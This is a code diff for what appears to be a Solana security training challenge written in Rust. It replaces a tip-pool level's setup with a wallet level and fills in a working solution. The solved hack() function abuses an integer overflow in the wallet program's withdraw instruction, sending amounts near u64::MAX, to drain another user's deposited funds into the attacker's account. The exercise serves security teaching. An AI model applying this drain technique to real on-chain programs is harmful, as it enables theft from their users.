@@ -1,7 +1,5 @@
 use std::{env, str::FromStr};
 
-use level3::{TipPool, TIP_POOL_LEN};
-
 use owo_colors::OwoColorize;
 use poc_framework::solana_sdk::signature::Keypair;
 use poc_framework::{
@@ -12,19 +10,59 @@ use solana_program::native_token::lamports_to_sol;
 use pocs::assert_tx_success;
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
 
-#[allow(dead_code)]
 struct Challenge {
     hacker: Keypair,
-    tip_program: Pubkey,
-    initizalizer: Pubkey,
-    poor_boi: Pubkey,
-    rich_boi: Pubkey,
-    tip_pool: Pubkey,
-    vault_address: Pubkey,
+    wallet_program: Pubkey,
+    wallet_address: Pubkey,
+    wallet_authority: Pubkey,
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    use solana_program::rent::Rent;
+
+    assert_tx_success(env.execute_as_transaction(
+        &[level2::initialize(
+            challenge.wallet_program,
+            challenge.hacker.pubkey(),
+        )],
+        &[&challenge.hacker],
+    ));
+    let hacker_wallet =
+        level2::get_wallet_address(challenge.hacker.pubkey(), challenge.wallet_program);
+    let minbal = Rent::default().minimum_balance(32);
+    println!("minbal: {}", lamports_to_sol(minbal));
+    let max = u64::MAX;
+    println!("max {}", max);
+    let bigval: u64 = max - minbal + 1;
+    println!("bigval {}", bigval);
+    let overflow = bigval;
+    let iters = 100;
+
+    for i in 0..iters {
+        let tx = env.execute_as_transaction(
+            &[level2::withdraw(
+                challenge.wallet_program,
+                challenge.hacker.pubkey(),
+                challenge.wallet_address,
+                overflow + i,
+            )],
+            &[&challenge.hacker],
+        );
+        tx.print_named(&format!("tx {}", i));
+    }
+    let target_bal: u64 = env.get_account(hacker_wallet).unwrap().lamports;
+    let tx = env.execute_as_transaction(
+        &[level2::withdraw(
+            challenge.wallet_program,
+            challenge.hacker.pubkey(),
+            challenge.hacker.pubkey(),
+            target_bal - minbal,
+        )],
+        &[&challenge.hacker],
+    );
+    tx.print_named("hacker");
+}
 
 /*
 SETUP CODE BELOW
@@ -37,7 +75,8 @@ pub fn main() {
 }
 
 struct Internal {
-    poor_boi: Keypair,
+    wallet_authority: Keypair,
+    wallet_amount: u64,
 }
 
 fn verify(
@@ -47,20 +86,15 @@ fn verify(
     internal: Internal,
 ) {
     let after = env.get_account(challenge.hacker.pubkey()).unwrap().lamports;
-    println!("[*] HACKSUCCESS: {}", after > before_balance);
-
-    //poor boi withdraws everything from pool
-    let pool: TipPool = env.get_deserialized_account(challenge.tip_pool).unwrap();
 
     let tx = env.execute_as_transaction(
-        &[level3::withdraw(
-            challenge.tip_program,
-            challenge.vault_address,
-            challenge.tip_pool,
-            challenge.poor_boi,
-            pool.value,
+        &[level2::withdraw(
+            challenge.wallet_program,
+            challenge.wallet_authority,
+            challenge.wallet_address,
+            internal.wallet_amount,
         )],
-        &[&internal.poor_boi],
+        &[&internal.wallet_authority],
     );
 
     tx.print_named("Verification: authority withdraw");
@@ -102,88 +136,65 @@ fn setup() -> (LocalEnvironment, Challenge, Internal) {
         dir.pop();
         dir.pop();
         dir.push("deploy");
-        dir.push("level3.so");
+        dir.push("level2.so");
         dir.to_str()
     }
     .unwrap();
 
-    let tip_program = Pubkey::from_str("T1p1111111111111111111111111111111111111111").unwrap();
-    let initizalizer = keypair(0);
-    let poor_boi = keypair(1);
-    let rich_boi = keypair(2);
-    let tip_pool = keypair(3);
+    let wallet_program = Pubkey::from_str("W4113t3333333333333333333333333333333333333").unwrap();
+    let wallet_authority = keypair(0);
+    let rich_boi = keypair(1);
     let hacker = keypair(42);
 
     let a_lot_of_money = sol_to_lamports(1_000_000.0);
 
     let mut env = LocalEnvironment::builder()
-        .add_program(tip_program, path)
+        .add_program(wallet_program, path)
         .add_account_with_lamports(
-            initizalizer.pubkey(),
+            wallet_authority.pubkey(),
             system_program::ID,
             sol_to_lamports(100.0),
         )
-        .add_account_with_lamports(poor_boi.pubkey(), system_program::ID, 0)
         .add_account_with_lamports(rich_boi.pubkey(), system_program::ID, a_lot_of_money * 2)
-        .add_account_with_lamports(hacker.pubkey(), system_program::ID, sol_to_lamports(2.0))
+        .add_account_with_lamports(hacker.pubkey(), system_program::ID, sol_to_lamports(1.0))
         .build();
 
-    let seed: u8 = 0;
-    let vault_address = Pubkey::create_program_address(&[&[seed]], &tip_program).unwrap();
+    let wallet_address = level2::get_wallet_address(wallet_authority.pubkey(), wallet_program);
 
-    // Create Vault
+    // Create Wallet
     assert_tx_success(env.execute_as_transaction(
-        &[level3::initialize(
-            tip_program,
-            vault_address,
-            initizalizer.pubkey(),
-            seed,
-            2.0,
-            vault_address,
+        &[level2::initialize(
+            wallet_program,
+            wallet_authority.pubkey(),
         )],
-        &[&initizalizer],
+        &[&wallet_authority],
     ));
 
-    println!("[*] Vault created!");
+    println!("[*] Wallet created!");
 
-    // Create Pool
-    env.create_account_rent_excempt(&tip_pool, TIP_POOL_LEN as usize, tip_program);
-
+    // rich boi pays for bill
     assert_tx_success(env.execute_as_transaction(
-        &[level3::create_pool(
-            tip_program,
-            vault_address,
-            poor_boi.pubkey(),
-            tip_pool.pubkey(),
-        )],
-        &[&poor_boi],
-    ));
-    println!("[*] Pool created!");
-
-    // rich boi tips pool
-    assert_tx_success(env.execute_as_transaction(
-        &[level3::tip(
-            tip_program,
-            vault_address,
-            tip_pool.pubkey(),
+        &[level2::deposit(
+            wallet_program,
+            wallet_authority.pubkey(),
             rich_boi.pubkey(),
             a_lot_of_money,
         )],
         &[&rich_boi],
     ));
-    println!("[*] rich boi tipped poor bois pool!");
+    println!("[*] rich boi payed his bills");
 
     (
         env,
         Challenge {
-            vault_address,
+            wallet_address,
             hacker,
-            tip_program,
-            initizalizer: initizalizer.pubkey(),
-            poor_boi: poor_boi.pubkey(),
-            rich_boi: rich_boi.pubkey(),
-            tip_pool: tip_pool.pubkey(),
+            wallet_program,
+            wallet_authority: wallet_authority.pubkey(),
         },
-        Internal { poor_boi },
+        Internal {
+            wallet_authority,
+            wallet_amount: a_lot_of_money,
+        },
     )
 }
